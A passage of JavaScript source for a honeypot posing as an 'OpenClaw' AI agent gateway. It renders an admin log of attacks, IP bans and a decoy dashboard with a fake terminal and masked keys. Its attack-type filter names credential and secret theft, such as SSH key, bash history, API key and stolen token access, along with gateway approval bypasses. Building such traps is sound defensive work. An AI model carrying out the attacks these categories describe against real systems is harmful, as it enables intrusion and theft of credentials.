    const uaTip = [a.user_agent, a.cf_ray?`CF-Ray: ${a.cf_ray}`:''].filter(Boolean).join('\n');
    return`<tr>
<td>${a.id}</td>
<td style="font-family:monospace;font-size:12px">${escapeHtml(a.ip)}${threatBadge}</td>
<td class="tip" data-tip="${escapeHtml(fullLoc)}" style="font-size:12px;max-width:120px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${escapeHtml(locStr)}</td>
<td style="font-weight:600;font-size:11px;color:${a.method==='POST'?'#d97706':'#2563eb'}">${escapeHtml(a.method)}</td>
<td class="tip" data-tip="${escapeHtml(bodyTip)}" style="font-family:monospace;font-size:12px;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${escapeHtml(a.path)}</td>
<td>${typeStr}</td>
<td>${sc(a.severity||'CLEAN')}</td>
<td style="color:#6b7280;font-size:12px;white-space:nowrap">${toCST(a.timestamp)}</td>
<td class="tip" data-tip="${escapeHtml(uaTip)}" style="max-width:140px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#9ca3af;font-size:11px">${escapeHtml((a.user_agent||'').slice(0,50))}</td>
</tr>`;
  }).join('');

  const banRows=bans.map(b=>`<tr><td style="font-family:monospace;font-size:12px">${escapeHtml(b.ip)}</td><td style="font-size:12px;color:#6b7280">${escapeHtml(b.reason||'-')}</td><td style="font-size:12px;color:#6b7280">${(b.banned_until||'').slice(0,19).replace('T',' ')}</td><td><form method="POST" action="/admin/unban" style="margin:0"><input type="hidden" name="ip" value="${escapeHtml(b.ip)}"><button type="submit" style="padding:3px 10px;font-size:11px;background:#fff;border:1px solid #d1d5db;border-radius:6px;cursor:pointer;color:#374151">Unban</button></form></td></tr>`).join('');

  const pgLinks=[];
  for(let i=1;i<=Math.min(totalPages,10);i++){
    const p=new URLSearchParams({...filters,page:i});const active=i===page;
    pgLinks.push(`<a href="/admin/dashboard?${p}" style="padding:5px 11px;border:1px solid ${active?'#111':'#e0e0e0'};border-radius:6px;font-size:13px;background:${active?'#111':'#fff'};color:${active?'#fff':'#333'};text-decoration:none">${i}</a>`);
  }

  return`<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Dashboard - Admin</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{background:#f5f5f5;color:#111;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:14px}.topbar{background:#111;color:#fff;padding:0 24px;height:52px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:10}.topbar-left{font-weight:600;font-size:15px}.topbar-right{display:flex;align-items:center;gap:16px;font-size:13px}.topbar-right a{color:#ccc;text-decoration:none}.topbar-right a:hover{color:#fff}.main{max-width:1400px;margin:0 auto;padding:24px}.stats-row{display:grid;grid-template-columns:repeat(5,1fr);gap:14px;margin-bottom:24px}.scard{background:#fff;border:1px solid #e0e0e0;border-radius:10px;padding:16px 20px}.scard-label{font-size:12px;color:#6b7280;margin-bottom:4px}.scard-value{font-size:26px;font-weight:700;line-height:1.2}.section{background:#fff;border:1px solid #e0e0e0;border-radius:10px;margin-bottom:24px;overflow:hidden}.section-header{padding:14px 20px;border-bottom:1px solid #e0e0e0;display:flex;align-items:center;justify-content:space-between}.section-title{font-size:14px;font-weight:600}.filter-form{display:flex;gap:10px;padding:14px 20px;border-bottom:1px solid #f0f0f0;flex-wrap:wrap;background:#fafafa}.filter-form input,.filter-form select{padding:7px 11px;border:1px solid #d1d5db;border-radius:7px;font-size:13px;outline:none;background:#fff}.filter-form button{padding:7px 16px;background:#111;color:#fff;border:none;border-radius:7px;font-size:13px;cursor:pointer}.filter-form a{padding:7px 14px;border:1px solid #d1d5db;border-radius:7px;font-size:13px;color:#374151;text-decoration:none;background:#fff}table{width:100%;border-collapse:collapse}th{text-align:left;padding:9px 14px;font-size:12px;font-weight:600;color:#6b7280;border-bottom:1px solid #e0e0e0;background:#fafafa;white-space:nowrap}td{padding:9px 14px;border-bottom:1px solid #f3f4f6;vertical-align:middle}tr:hover td{background:#fafafa}tr:last-child td{border-bottom:none}.pagination{display:flex;gap:6px;padding:14px 20px;justify-content:center;flex-wrap:wrap}.empty{padding:40px;text-align:center;color:#9ca3af;font-size:14px}.logout-btn{padding:6px 14px;background:transparent;border:1px solid #444;color:#ccc;border-radius:6px;font-size:12px;cursor:pointer;text-decoration:none}@media(max-width:900px){.stats-row{grid-template-columns:repeat(3,1fr)}}@media(max-width:600px){.stats-row{grid-template-columns:repeat(2,1fr)}}
#ttp{position:fixed;background:#1f2937;color:#f3f4f6;padding:8px 12px;border-radius:7px;font-size:12px;max-width:480px;word-break:break-all;line-height:1.7;z-index:9999;pointer-events:none;display:none;box-shadow:0 4px 16px rgba(0,0,0,.35);white-space:pre-wrap;border:1px solid #374151}
.tip{cursor:default}
</style>
</head><body>
<div class="topbar"><div class="topbar-left">OpenClaw Honeypot &mdash; Admin</div><div class="topbar-right"><a href="/admin/dashboard">Attacks</a><a href="/admin/logout" class="logout-btn">Sign Out</a></div></div>
<div class="main">
  <div class="stats-row">
    <div class="scard"><div class="scard-label">Total Records</div><div class="scard-value">${stats.total||0}</div></div>
    <div class="scard"><div class="scard-label">Last 24h</div><div class="scard-value">${stats.recent24h||0}</div></div>
    <div class="scard"><div class="scard-label" style="color:#dc2626">Critical</div><div class="scard-value" style="color:#dc2626">${bySevMap['CRITICAL']||0}</div></div>
    <div class="scard"><div class="scard-label" style="color:#ef4444">High</div><div class="scard-value" style="color:#ef4444">${bySevMap['HIGH']||0}</div></div>
    <div class="scard"><div class="scard-label" style="color:#f59e0b">Medium</div><div class="scard-value" style="color:#f59e0b">${bySevMap['MEDIUM']||0}</div></div>
  </div>
  <div class="section">
    <div class="section-header"><span class="section-title">Attack Log</span><span style="font-size:12px;color:#6b7280">${stats.total||0} records &mdash; page ${page}/${totalPages||1}</span></div>
    <form class="filter-form" method="GET" action="/admin/dashboard">
      <input type="text" name="ip" placeholder="Filter IP" value="${escapeHtml(filters.ip||'')}">
      <select name="severity"><option value="ALL" ${!filters.severity||filters.severity==='ALL'?'selected':''}>All Severity</option>${['CRITICAL','HIGH','MEDIUM','LOW','CLEAN'].map(s=>`<option value="${s}" ${filters.severity===s?'selected':''}>${s}</option>`).join('')}</select>
      <select name="type"><option value="ALL" ${!filters.type||filters.type==='ALL'?'selected':''}>All Types</option>${['SQL_INJECTION','XSS','PATH_TRAVERSAL','COMMAND_INJECTION','SSRF','TEMPLATE_INJECTION','LOG4SHELL','SPRINGSHELL','SCANNER','SUSPICIOUS_UA','CONFIG_ACCESS','API_KEYS_ACCESS','SHELL_EXECUTE','SSH_KEY_ACCESS','BASH_HISTORY_ACCESS','OPENAI_API_ABUSE','CVE_2026_25253_GATEWAY_URL','CVE_2026_28464_PATH_TRAVERSAL','STOLEN_TOKEN_USE','AUTH_BYPASS_ATTEMPT','PATH_TRAVERSAL_ATTEMPT','EXEC_APPROVAL_BYPASS','WEBHOOK_NO_AUTH','MEMORY_ACCESS','MEMORY_EXPORT','SSRF_GATEWAY_REDIRECT'].map(t=>`<option value="${t}" ${filters.type===t?'selected':''}>${t}</option>`).join('')}</select>
      <input type="date" name="dateFrom" value="${escapeHtml(filters.dateFrom||'')}"><input type="date" name="dateTo" value="${escapeHtml(filters.dateTo||'')}">
      <button type="submit">Filter</button><a href="/admin/dashboard">Reset</a><a href="/admin/export?${new URLSearchParams(filters)}">Export CSV</a>
    </form>
    ${attacks.length===0?'<div class="empty">No records found.</div>':`<div style="overflow-x:auto"><table><thead><tr><th>#</th><th>IP (Threat)</th><th>Location</th><th>Method</th><th>Path</th><th>Attack Types</th><th>Severity</th><th>Time (UTC)</th><th>User-Agent</th></tr></thead><tbody>${attackRows}</tbody></table></div><div class="pagination">${pgLinks.join('')}</div>`}
  </div>
  <div class="section">
    <div class="section-header"><span class="section-title">Top Attacking IPs</span></div>
    ${stats.topIPs&&stats.topIPs.length>0?`<div style="overflow-x:auto"><table><thead><tr><th>IP</th><th>Country</th><th>Requests</th><th>Action</th></tr></thead><tbody>${stats.topIPs.map(r=>`<tr><td style="font-family:monospace;font-size:12px">${escapeHtml(r.ip)}</td><td>${escapeHtml(r.country||'-')}</td><td style="font-weight:600">${r.cnt}</td><td><form method="POST" action="/admin/ban" style="margin:0"><input type="hidden" name="ip" value="${escapeHtml(r.ip)}"><button type="submit" style="padding:3px 10px;font-size:11px;background:#fef2f2;border:1px solid #fecaca;border-radius:6px;cursor:pointer;color:#dc2626">Ban IP</button></form></td></tr>`).join('')}</tbody></table></div>`:'<div class="empty">No data yet.</div>'}
  </div>
  <div class="section">
    <div class="section-header"><span class="section-title">Active IP Bans</span></div>
    ${bans.length===0?'<div class="empty">No active bans.</div>':`<div style="overflow-x:auto"><table><thead><tr><th>IP</th><th>Reason</th><th>Expires (UTC)</th><th>Action</th></tr></thead><tbody>${banRows}</tbody></table></div>`}
  </div>
</div>
<div id="ttp"></div>
<script>
(function(){
  var tip=document.getElementById('ttp');
  var cur=null;
  function show(el,e){tip.textContent=el.dataset.tip;tip.style.display='block';move(e);}
  function move(e){
    var x=e.clientX+14,y=e.clientY+14;
    var tw=tip.offsetWidth,th=tip.offsetHeight;
    if(x+tw>window.innerWidth-8)x=e.clientX-tw-10;
    if(y+th>window.innerHeight-8)y=e.clientY-th-10;
    tip.style.left=x+'px';tip.style.top=y+'px';
  }
  function hide(){tip.style.display='none';}
  document.addEventListener('mouseover',function(e){
    var el=e.target.closest('[data-tip]');
    if(el&&el!==cur){cur=el;show(el,e);}
    else if(!el&&cur){cur=null;hide();}
  });
  document.addEventListener('mousemove',function(e){if(cur)move(e);});
  document.addEventListener('mouseout',function(e){
    if(!e.relatedTarget||!e.relatedTarget.closest('[data-tip]')){cur=null;hide();}
  });
})();
</script>
</body></html>`;
}


// ============================================================
// SECTION 9: MAIN DASHBOARD HTML (v2026 UI)
// ============================================================
function htmlDashboard(uptimeMs) {
  const uptime = formatUptime(uptimeMs);
  const cfg = JSON.parse(FAKE_FS['/root/.openclaw/openclaw.json']);
  const maskKey = k => k ? k.slice(0,12)+'••••••••••••••••' : '(not set)';

  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>OpenClaw Gateway</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{--bg:#0a0a0b;--sidebar:#111114;--card:#141418;--border:#252529;--text:#e2e2e5;--muted:#71717a;--green:#22c55e;--red:#ef4444;--yellow:#eab308;--blue:#3b82f6;--orange:#f97316;--font:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
body{background:var(--bg);color:var(--text);font-family:var(--font);min-height:100vh;display:flex;flex-direction:column;font-size:14px;line-height:1.5}
a{color:var(--blue);text-decoration:none}
/* Layout */
.layout{display:flex;flex:1;min-height:0}
/* Sidebar */
.sidebar{width:200px;background:var(--sidebar);border-right:1px solid var(--border);display:flex;flex-direction:column;position:fixed;top:0;left:0;height:100vh;z-index:20;padding-top:0}
.sidebar-brand{display:flex;align-items:center;gap:9px;padding:16px 16px 14px;border-bottom:1px solid var(--border)}
.brand-icon{width:28px;height:28px;background:linear-gradient(135deg,var(--orange),#dc2626);border-radius:7px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.brand-icon svg{width:15px;height:15px;fill:#fff}
.brand-name{font-weight:700;font-size:15px;letter-spacing:-.3px}
.brand-ver{font-size:10px;background:rgba(249,115,22,.15);color:var(--orange);padding:1px 6px;border-radius:10px;font-weight:500;margin-left:2px}
.sidebar-nav{flex:1;padding:8px 0;overflow-y:auto}
.nav-item{display:flex;align-items:center;gap:9px;padding:8px 14px;font-size:13px;color:var(--muted);cursor:pointer;border-radius:0;transition:.12s;border-left:2px solid transparent;text-decoration:none}
.nav-item:hover{color:var(--text);background:rgba(255,255,255,.04)}
.nav-item.active{color:var(--text);background:rgba(249,115,22,.08);border-left-color:var(--orange)}
.nav-item svg{width:15px;height:15px;flex-shrink:0;opacity:.7}
.nav-item.active svg{opacity:1}
.sidebar-footer{padding:12px 14px;border-top:1px solid var(--border);font-size:11px;color:var(--muted)}
/* Main */
.main-wrap{margin-left:200px;flex:1;display:flex;flex-direction:column;min-height:100vh}
/* Header */
.header{display:flex;align-items:center;justify-content:space-between;padding:12px 24px;border-bottom:1px solid var(--border);background:rgba(10,10,11,.8);backdrop-filter:blur(8px);position:sticky;top:0;z-index:10}
.header-left{display:flex;align-items:center;gap:12px;font-size:13px;color:var(--muted)}
.status-dot{width:7px;height:7px;border-radius:50%;background:var(--green);box-shadow:0 0 5px var(--green);animation:pulse 2s infinite;flex-shrink:0}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
.header-right{display:flex;align-items:center;gap:14px;font-size:12px;color:var(--muted)}
.header-right a{color:var(--muted);font-size:12px}
.header-right a:hover{color:var(--text)}
.fast-badge{padding:2px 8px;background:rgba(59,130,246,.12);color:var(--blue);border-radius:10px;font-size:11px;font-weight:500;cursor:pointer}
/* Content */
.content{flex:1;padding:24px;overflow-y:auto}
/* Tab panels */
.tab-panel{display:none}.tab-panel.active{display:block}
/* Stats grid */
.stats-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:24px}
.stat-card{background:var(--card);border:1px solid var(--border);border-radius:9px;padding:16px 18px}
.stat-label{font-size:11px;color:var(--muted);margin-bottom:5px;text-transform:uppercase;letter-spacing:.5px}
.stat-value{font-size:22px;font-weight:700;line-height:1.2}
.stat-sub{font-size:11px;color:var(--muted);margin-top:3px}
/* Section header */
.sec-head{font-size:11px;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:.6px;margin-bottom:12px;margin-top:22px}
.sec-head:first-child{margin-top:0}
/* Channel grid */
.ch-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:24px}
.ch-card{background:var(--card);border:1px solid var(--border);border-radius:9px;padding:14px 15px;display:flex;align-items:center;gap:12px}
.ch-icon{width:34px;height:34px;border-radius:8px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.ch-body{flex:1;min-width:0}
.ch-name{font-size:13px;font-weight:500;text-transform:capitalize}
.ch-detail{font-size:11px;color:var(--muted);margin-top:2px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.badge{font-size:10px;padding:2px 7px;border-radius:10px;font-weight:600;white-space:nowrap}
.b-ok{background:rgba(34,197,94,.12);color:var(--green)}
.b-err{background:rgba(239,68,68,.12);color:var(--red)}
.b-off{background:rgba(113,113,122,.12);color:var(--muted)}
/* Table */
.tbl-wrap{background:var(--card);border:1px solid var(--border);border-radius:9px;overflow:hidden;margin-bottom:24px}
table{width:100%;border-collapse:collapse}
th{text-align:left;padding:9px 14px;font-size:11px;color:var(--muted);font-weight:500;border-bottom:1px solid var(--border);background:rgba(255,255,255,.02);white-space:nowrap}
td{padding:11px 14px;font-size:13px;border-bottom:1px solid var(--border)}
tr:last-child td{border-bottom:none}
tr:hover td{background:rgba(255,255,255,.02)}
/* Code block */
.code-block{background:#0d1117;border:1px solid var(--border);border-radius:9px;padding:16px;font-family:'SF Mono',Consolas,monospace;font-size:12px;line-height:1.7;overflow:auto;max-height:500px;color:#c9d1d9;white-space:pre}
.json-key{color:#79c0ff}.json-str{color:#a5d6ff}.json-num{color:#79c0ff}.json-bool{color:#ff7b72}.json-null{color:#ff7b72}
/* Logs */
.log-wrap{background:#0d1117;border:1px solid var(--border);border-radius:9px;font-family:'SF Mono',Consolas,monospace;font-size:12px;overflow:hidden}
.log-toolbar{display:flex;align-items:center;justify-content:space-between;padding:8px 14px;border-bottom:1px solid var(--border);background:rgba(255,255,255,.02)}
.log-toolbar button{padding:4px 12px;background:var(--card);border:1px solid var(--border);color:var(--muted);border-radius:6px;font-size:11px;cursor:pointer;font-family:inherit}
.log-toolbar button:hover{color:var(--text)}
.log-body{padding:10px 14px;max-height:420px;overflow-y:auto;line-height:1.8}
.log-line{display:flex;gap:12px}
.log-ts{color:var(--muted);flex-shrink:0;min-width:190px}
.log-lvl-INF{color:#71717a}.log-lvl-WRN{color:var(--yellow)}.log-lvl-ERR{color:var(--red)}
/* Chat */
.chat-feed{display:flex;flex-direction:column;gap:16px;margin-bottom:24px}
.chat-msg{background:var(--card);border:1px solid var(--border);border-radius:9px;overflow:hidden}
.chat-head{display:flex;align-items:center;gap:9px;padding:9px 14px;border-bottom:1px solid var(--border);background:rgba(255,255,255,.02);font-size:12px;color:var(--muted)}
.chat-body{padding:12px 14px;font-size:13px;line-height:1.6;white-space:pre-wrap}
.chat-user{color:var(--text)}.chat-agent{color:#c9d1d9}
.tool-call{background:rgba(59,130,246,.06);border:1px solid rgba(59,130,246,.2);border-radius:6px;padding:6px 10px;font-family:'SF Mono',Consolas,monospace;font-size:11px;color:var(--blue);margin:6px 0}
.ch-pill{padding:2px 8px;border-radius:10px;font-size:11px;font-weight:600}
.pill-wa{background:rgba(37,211,102,.15);color:#25d366}
.pill-tg{background:rgba(44,165,224,.15);color:#2ca5e0}
.pill-dc{background:rgba(88,101,242,.15);color:#5865f2}
/* Terminal */
.term-wrap{background:#0d0e0f;border:1px solid var(--border);border-radius:9px;overflow:hidden;margin-bottom:24px;min-height:480px;display:flex;flex-direction:column}
.term-bar{background:#1c1e22;display:flex;align-items:center;gap:6px;padding:9px 14px;border-bottom:1px solid #1f2228}
.term-dot{width:11px;height:11px;border-radius:50%}
.term-title{font-size:12px;color:#666;margin-left:6px;font-family:'SF Mono',Consolas,monospace}
.term-output{flex:1;padding:12px 16px;font-family:'SF Mono',Consolas,monospace;font-size:13px;line-height:1.7;overflow-y:auto;color:#33ff33;max-height:380px;white-space:pre-wrap;word-break:break-all}
.term-output .t-err{color:#ff5555}
.term-output .t-prompt{color:#33ff33}
.term-output .t-cmd{color:#fff}
.term-input-row{display:flex;align-items:center;gap:0;border-top:1px solid #1f2228;background:#0d0e0f;padding:8px 16px}
.term-prompt-label{font-family:'SF Mono',Consolas,monospace;font-size:13px;color:#33ff33;white-space:nowrap;margin-right:8px}
#term-input{flex:1;background:transparent;border:none;outline:none;color:#fff;font-family:'SF Mono',Consolas,monospace;font-size:13px;caret-color:#33ff33}
/* Skills grid */
.skills-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:24px}
.skill-card{background:var(--card);border:1px solid var(--border);border-radius:9px;padding:14px 16px}
.skill-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:6px}
.skill-name{font-size:13px;font-weight:500}
.skill-ver{font-size:11px;color:var(--muted)}
.skill-toggle{width:34px;height:18px;border-radius:9px;cursor:pointer;border:none;position:relative;transition:.15s}
.skill-on{background:var(--green)}.skill-off{background:var(--border)}
.skill-toggle::after{content:'';position:absolute;top:2px;width:14px;height:14px;border-radius:50%;background:#fff;transition:.15s}
.skill-on::after{right:2px}.skill-off::after{left:2px}
/* API section */
.api-card{background:var(--card);border:1px solid var(--border);border-radius:9px;padding:18px;margin-bottom:24px}
.api-base{font-family:'SF Mono',Consolas,monospace;font-size:12px;background:rgba(255,255,255,.05);padding:7px 11px;border-radius:6px;margin-bottom:14px;color:var(--muted)}
.ep-list{display:flex;flex-direction:column;gap:4px}
.ep-row{display:flex;align-items:center;gap:10px;padding:6px 9px;border-radius:6px;transition:.12s;text-decoration:none;color:var(--text)}
.ep-row:hover{background:rgba(255,255,255,.04)}
.ep-method{font-family:'SF Mono',Consolas,monospace;font-size:11px;font-weight:700;width:36px;color:var(--green)}
.ep-method.post{color:var(--yellow)}
.ep-path{font-family:'SF Mono',Consolas,monospace;font-size:12px;flex:1}
.ep-tag{font-size:10px;padding:1px 6px;border-radius:4px;font-weight:600}
.tag-sens{background:rgba(239,68,68,.12);color:var(--red)}
.tag-ok{background:rgba(34,197,94,.1);color:var(--green)}
.tag-crit{background:rgba(220,38,38,.2);color:#fca5a5}
/* Config warning */
.cfg-warn{display:flex;align-items:center;gap:8px;background:rgba(234,179,8,.08);border:1px solid rgba(234,179,8,.25);border-radius:8px;padding:10px 14px;margin-bottom:14px;font-size:13px;color:var(--yellow)}
/* Responsive */
@media(max-width:900px){.stats-grid{grid-template-columns:repeat(2,1fr)}.ch-grid{grid-template-columns:1fr 1fr}.skills-grid{grid-template-columns:1fr 1fr}}
@media(max-width:640px){.sidebar{display:none}.main-wrap{margin-left:0}.stats-grid{grid-template-columns:1fr 1fr}.ch-grid{grid-template-columns:1fr}}
footer{border-top:1px solid var(--border);padding:14px 24px;font-size:11px;color:var(--muted);margin-left:200px}
.footer-inner{max-width:100%;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px}
.bsz{display:flex;gap:16px}
</style>
</head>
<body>
<div class="layout">
<!-- Sidebar -->
<nav class="sidebar">
  <div class="sidebar-brand">
    <div class="brand-icon"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg></div>
    <span class="brand-name">OpenClaw</span>
    <span class="brand-ver">v${HONEYPOT_VERSION}</span>
  </div>
  <div class="sidebar-nav">
    <a class="nav-item active" data-tab="overview" href="#">
      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M3 13h8V3H3v10zm0 8h8v-6H3v6zm10 0h8V11h-8v10zm0-18v6h8V3h-8z"/></svg>
      Overview
    </a>
    <a class="nav-item" data-tab="chat" href="#">
      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>
      Chat
    </a>
    <a class="nav-item" data-tab="sessions" href="#">
      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg>
      Sessions
    </a>
    <a class="nav-item" data-tab="config" href="#">
      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M19.14 12.94c.04-.3.06-.61.06-.94s-.02-.64-.07-.94l2.03-1.58c.18-.14.23-.41.12-.61l-1.92-3.32c-.12-.22-.37-.29-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58c-.18.14-.23.41-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg>
      Config
    </a>
    <a class="nav-item" data-tab="logs" href="#">
      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-5 3h4v2h-4V7zm0 4h4v2h-4v-2zM4 7h9v12H4V7zm11 8h4v2h-4v-2z"/></svg>
      Logs
    </a>
    <a class="nav-item" data-tab="terminal" href="#">
      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V6h16v12zM6.5 10.5l1.41-1.41L11.5 13l-3.59 3.59L6.5 15.18 9.09 13l-2.59-2.5z"/></svg>
      Terminal
    </a>
    <a class="nav-item" data-tab="skills" href="#">
      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M20.5 11H19V7c0-1.1-.9-2-2-2h-4V3.5C13 2.12 11.88 1 10.5 1S8 2.12 8 3.5V5H4c-1.1 0-2 .9-2 2v3.8H3.5c1.49 0 2.7 1.21 2.7 2.7s-1.21 2.7-2.7 2.7H2V19c0 1.1.9 2 2 2h3.8v-1.5c0-1.49 1.21-2.7 2.7-2.7s2.7 1.21 2.7 2.7V21H17c1.1 0 2-.9 2-2v-4h1.5c1.38 0 2.5-1.12 2.5-2.5S21.88 11 20.5 11z"/></svg>
      Skills
    </a>
  </div>
  <div class="sidebar-footer">
    <div>Node v${FAKE_NODE_VERSION}</div>
    <div>PID 1024 &nbsp;|&nbsp; :18789</div>
  </div>
</nav>

<!-- Main content -->
<div class="main-wrap">
  <header class="header">
    <div class="header-left">
      <span class="status-dot"></span>
      <span>Gateway Online</span>
      <span style="color:var(--border)">|</span>
      <span>Uptime: ${uptime}</span>
      <span style="color:var(--border)">|</span>
      <span>claude-opus-4-5</span>
    </div>
    <div class="header-right">
      <span class="fast-badge">Fast Mode: OFF</span>
      <a href="/api/v1/status">API</a>
      <a href="https://docs.openclaw.ai" target="_blank">Docs</a>
    </div>
  </header>

  <div class="content">

    <!-- TAB: OVERVIEW -->
    <div class="tab-panel active" id="tab-overview">
      <div class="stats-grid">
        <div class="stat-card"><div class="stat-label">Channels</div><div class="stat-value" style="color:var(--green)">5/5</div><div class="stat-sub">all connected</div></div>
        <div class="stat-card"><div class="stat-label">Active Sessions</div><div class="stat-value">1</div><div class="stat-sub">main &mdash; claude-opus-4-5</div></div>
        <div class="stat-card"><div class="stat-label">Messages Today</div><div class="stat-value">142</div><div class="stat-sub">284,318 tokens &mdash; $4.26</div></div>
        <div class="stat-card"><div class="stat-label">Uptime</div><div class="stat-value" style="font-size:18px">${uptime}</div><div class="stat-sub">since today 00:30</div></div>
      </div>

      <div class="sec-head">Channels</div>
      <div class="ch-grid">
        <div class="ch-card">
          <div class="ch-icon" style="background:#128c7e"><svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg></div>
          <div class="ch-body"><div class="ch-name">WhatsApp</div><div class="ch-detail">+1 (555) &bull;&bull;&bull;-4521</div></div>
          <span class="badge b-ok">connected</span>
        </div>
        <div class="ch-card">
          <div class="ch-icon" style="background:#2ca5e0"><svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg></div>
          <div class="ch-body"><div class="ch-name">Telegram</div><div class="ch-detail">@oc_assistant_bot</div></div>
          <span class="badge b-ok">connected</span>
        </div>
        <div class="ch-card">
